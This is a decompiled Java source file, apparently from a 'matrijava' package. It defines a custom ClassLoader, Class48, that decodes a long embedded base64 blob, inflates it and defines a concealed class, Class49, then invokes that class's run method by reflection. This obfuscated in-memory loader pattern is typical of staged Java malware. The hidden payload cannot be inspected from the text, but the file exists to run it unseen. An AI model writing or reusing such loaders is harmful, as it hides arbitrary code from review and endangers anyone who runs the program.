import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.InflaterInputStream;
import javax.xml.bind.DatatypeConverter;
import matrijava.Class48;

public class Class48 extends ClassLoader {
  public Class48(ClassLoader paramClassLoader) {
    super(paramClassLoader);
  }
  
  public Class<?> loadClass(String paramString, byte[] paramArrayOfbyte) throws ClassNotFoundException {
    return defineClass(paramString, paramArrayOfbyte, 0, paramArrayOfbyte.length);
  }
  
  public static void run() throws Exception {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("eNqNV+mS49Z1PpRm1K1Wy5JG+2ZLsmPPDEYCAYIk6HEUgQRAggDBHVzkLNgBAsQOEGAWZ9/zCvmbv3GVa6SKEj9AKu+SF3AlueweaUbSqCrNqvtdnHvud5YL3D7nP//n334NABT80wXcg94F/BDYM+Au4Gngz6F/wsE5COcwPAfxHKRzGJ2D");
    stringBuilder.append("fA7jc5icw/QcZucwP4fFOSzPQTmpr04c6wvYwPYCPoWfn8HvnsHvXcBb8PsX8Cb8wRmoF/Au8Cc17TTTL8AA8/RonYF9csM5PVz54p5D+wx2F3AbvDPwL2APwRmENXjmZ27gZh/X4K3b0k4tVNxXAxvv+WqaSqFqmMn9O0oNbvRCw6zBC5Ib");
    stringBuilder.append("mHK+18xkoWo+kjzrI6Ur7Rr85HGGeZa4gX3/0+6db9Ler8EFV+pmlLlhkJ5BhFjmrh2oWZ4gxrv/P5af3f0YET2d5AEab99RziBGbkZuhCg+ekjhhrgQRHmGWEx1f/8r4TjPHklP4T0/z1TdG6nRVVRnkNTgZh4cXeTaM7eR8U+7T47u25IT");
    stringBuilder.append("28U8zBPd5N1Tgi6vvKU6H51UL+FD+OgSUshq8Po393Zz10f5PunQNfiVKceykvsV6durSSHMe72+QQ4GZMedldpxQ/FRwWRDeZRitCDM0ul+We9t5nNuKCw4OacrC7MKg1+t27Nk0mEmo4o+SMaoMeLW27a7JWNbjdoJcqx5LCTCInO8WFkF");
    stringBuilder.append("To+Y3oBKDzlm5x2DZiRyMGHH3U1xaNiepU18bYgfbWdoLyivKYx7fNQiRHJjhHxfd1uXkEOBfBcYo9ktp/pysOj2oplOd1mRjbtGymiFpo3FyUrWl8x6ZWVl4yBwRkxu8CMzWQUau7OFjbS2B4EtbqRJKhWDSbfN5C3aIxZDnGMZlybdo9Ch");
    stringBuilder.append("lvlAmR5Fhx7JztKcaGHSbyhz2RbVPjGbCibfUxSJzzrTxYI0l3z3qNT5namtuoOywW84gl16ncYk3TTwcGmENIPcVshkzgXKop7NHQZvMaJY1uOJuN/Oe24T77CmaTVtric58drNJV/RacYaLQmj7vBusyx79dTVYz/dh6FDW1inN1eKfWRs");
    stringBuilder.append("8vaxmdAxYbqGhdgDe3GYpissGtUTDt+XOxoFT7b2zVhjp+uY8PvzeikZ4USnyUPUoJpZK1QLapY26B4zpSezRaNt+6LhFCS18ZDbVM8sk2E68L19gPf2/TbP86O5IPDDPCnNoGPrwZJft6axt2f7I7nyiNgVfd6bxf1M54sZaXNHisGXI9+3");
    stringBuilder.append("ZgYhG8F2N9xus11f7gZVnPQUzPG6tExoh0p1Qk/W5H3eaYqH1owdacScjyND9uTjWnLV+ZpbrNWhhHPlZCUogrCbzBKNcaKpvJvoeGPLEgvOl43TC647A2JQRfKqp+69ZO1sNi29PpLIyGl7XrtxCC1sK7Bi1Trs64LVmfnc0IknTT3pOeKm");
    stringBuilder.append("0iPScvSYnreWuWHvVnIUiNhsIFRqMJhN4/QobxJj7BjRklbyrWZEFa/aC3vPr93lMt07cVTEAWF2vaLK+TzyD9F+oBBzIZmlk4hIe4GMx6yUZUXZWR7GqzXPdCfokvsVMfKruGLGx34V+ZtS9nmxq2KRLGyNKDYaeixvR+zSVzRp1TtORzkx");
    stringBuilder.append("mtc3TV6UvMmwUkrB5cxmKDeVSkiYZZxY0lFTRw0uXq5XxyPdELY+p7OV32d3w57VccXdKmetXVvnKKKlZLtMPJJW5ZhKR+C2e2PRaaxbDLssN+miXqaOmskFsZfTTCR5JeH7tBKLMxu5bahyGaVammFK3+gzB3o3VcN4yg2nRtzRD15oJSqz");
    stringBuilder.append("lGWvJxbzfUX5rZjvJOTW6U2rhYqZKjaTo1CO2pgZ4FZsK5Op4rWFTWvsEoF/yAlhOF8MLXe7xgmq31tFmDcn9SjwEqU7XlMHckROWupGHYQrbuzkQ0zMaI9LWqq39aNuy3MOEptm22l7rlKHPk/tc6aP3CbHZpwcE0/ExqIn65s4NuUlUSn9");
    stringBuilder.append("pZHoaoOpkrSqH0iZbHHbKR1sZwNcJ/aOlW71cNtZUXLHG8/7XsSPw4O7cg6CQy5zblOvW4q/P6BgYzk6TJN+3PfrayGcOPGyDMzWmml6c6NpS8rcai56kY317TiaVqK9kSu5zOdlyo9Wdtbcbldid11W0kwdorzLI2czQm5nhZbUi13HPAhm");
    stringBuilder.append("J/DouaU2ydBPIvTKNebdXnmot7nBgAlneUtgfcbwRhOekczjCLO2y1B0p7rhquKOFrfhuseNmKRN+4uBuyTGo/50gxca+t47i6bNVHUrnRzE1KQOU7ork649Jlm7a4/7WszYixErznTJGy9JtL6Q2G1+cFbHds9cNTfT2S6ZoFOb5hXJCqdP");
    stringBuilder.append("cjQYsHx/w02klnKY+hS+2WPJ0I+OiqTxx9noIMqSVxVqd1s028maZwsJG+tZ0dCTSW6U2WSADYiGMpstt5RJFQul4I6s4I4X/qi9LPuHLAgW+hhfWyJ9nPAUI7KsnnoNdWzNOzuLL81VKQwD8bhpjE1z3NAZc3UkSXpsYnszVohUsjU14GmR");
    stringBuilder.append("prfjivMtYaoMkdvaVh428oUcz6m9PFh6/VgzsHJlyNTWDbqYSCldfRl4bLFFL4dNaRpGTGU5iOrdRZvAtQJD/xa2VTMo2GIWzefqetpI8LxPFtq+lAizZKX+juplXOBydkOaTBKTz+d5JLTIgRX6FhtIJEvQoh63t3mcM7IVZnTX0grWYUlt");
    stringBuilder.append("s9tluFtnpugKbzUG5uHI7Y47FrndL40BQZTtQVNzep2FnerMJDxO2tvt0clTs11ouw5dcik+bvTK+qaPc1JFSS6nV52UIg/dRjo0IkaYb49qz5FFMqw3HW+R96PNMDAsT2hn005MUUdqcVgYNMZVpZp0juWAYltdrKkPtZBZlHWdSlKONZly");
    stringBuilder.append("Qkv0eNHu17fljuqu20ShlUIp6EOhO9aHdM/W7MBHblfNpY8J5rEpe5jtYhTbwLoYsZthDkdj4wzH8cZu0qfbx3GiG10iMamVUiw1m526bmnXpYJmjC41w+ylxWXLrjAam916bnbIncs7nUOUDHrmhrA7jmfxS2LHVg62LuQ0oJkFO2k3UkrZ");
    stringBuilder.append("08lxsJKJnZCVu2ZOFuFcDIIW0+DWnhbRzTaTljK13sU83zkMC7ZCN4kk0VnRVqVVQXRaRbJo7WkFP8TpzuRI2xqMuD6+lvhda4s10CeiNNMmuyHbvUZeT1uKySzS4y6d4TPckawQ0b20V1HRdirhProq8Jr1SzhAeQlt+OQMqks4wh+ewR9d");
    stringBuilder.append("wh/Dn9Tg/ataL89cH0dFJSpKLV/NzOSx4rQG73xZnXarzGSSRK0eWz4Vhb84DX9ag3e/pfh4PXsJP4X7l/Bn8Odn8BeX8JfwV5fwMfzO4x7jD0vSS/hr+JtLIIBElf03yutL+Fv4uxq8+Eg81namnp3B31/CP8A/1uDVJ3YLNXjvG3I5zPgw");
    stringBuilder.append("D4yvSv4avPxI5THpU6cq+znDtFCP8bCjuPPEXkAQntRTPKNGkRmgW+zDJ2y6I31HtY02nmfhtagGr9z+tuL9L/39ejeBmg0EyNzNU4MgoL1P6i7Q8iFxM9QHnN2+clx5uAHhG0/uUk5Lz2XhV4eLDN2+akCuElvi5d7HNTcwcFbN1KyKzF4Y");
    stringBuilder.append("FGaSnXL/UqQmqdlVU7NFdd1ATdDu156UjhPfK7aZzas0M/dfO783b9/5jkYQ9Wloy8jMnBDF/cmTzuZb5/I4V2JaPnqF8GsGRPfGd62h03SDIvRQ3jqPm7l+B79m5qHozrdF8D7qe+/B6e8ZqJ06LzTi6OkDeAr9kPQu9hnUfolmNaij8eJK");
    stringBuilder.append("+jzchO8hCfosUBN+rX8TzdD6Xeze0/d+/QCe+tev9pyYAV6EBhpvoDkFTTR7ClrwLLoKaDQ7MfwXwpNe9gU8vfkMboh3b918AM+s7t46u4bza3j2Gi6u4blruLyG56/he9fwwjW8eA0vXcOta3j5BLdeufsAXv0cXnsUHw8vofFlOIdX4AV4");
    stringBuilder.append("FV5Dv3fhdfgRvAEYvInifQs68DZ8Au9AH63I8H1Ywg/g5/Ae6CibO5TPFGl/GWsHxYgum4cxTpHsBsK3X7oB/34+unvvAby++fif4XmUtHcfwBv/8r///cur1JxcuXWl+mOUvtsoeXeQYQx+hiSX8NRv4Jkz+O3fwMu1rxlCd9hDQ/zD4/jg");
    stringBuilder.append("C3hz8wW8tbn7Gbz9GbwjfQHvouR+f4Td+xx+gMy/9+iYru19iGx9hILFUXD1r7GjW/sh+xpx30RYxz6H9z+HD0ZfwA83n8OPPoPfkj88BfXjn95488atnzz9H3D7AdypIUSJxlaP0vza1f4GSjOFkt1ECW0h5vZj9mrAXGWi+38kqj0b");
    run("matrijava.Class49", stringBuilder.toString());
  }
  
  public static void pipe(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
    byte[] arrayOfByte = new byte[1024];
    int i;
    while ((i = paramInputStream.read(arrayOfByte)) > 0)
      paramOutputStream.write(arrayOfByte, 0, i); 
  }
  
  public static byte[] unzip(byte[] paramArrayOfbyte) throws Exception {
    InflaterInputStream inflaterInputStream = new InflaterInputStream(new ByteArrayInputStream(paramArrayOfbyte));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    pipe(inflaterInputStream, byteArrayOutputStream);
    return byteArrayOutputStream.toByteArray();
  }
  
  public static void run(String paramString1, String paramString2) throws Exception {
    byte[] arrayOfByte = unzip(DatatypeConverter.parseBase64Binary(paramString2));
    Class48 class48 = new Class48(ClassLoader.getSystemClassLoader());
    Class<?> clazz = class48.loadClass(paramString1, arrayOfByte);
    clazz.getMethod("run", new Class[0]).invoke(null, new Object[0]);
  }
}
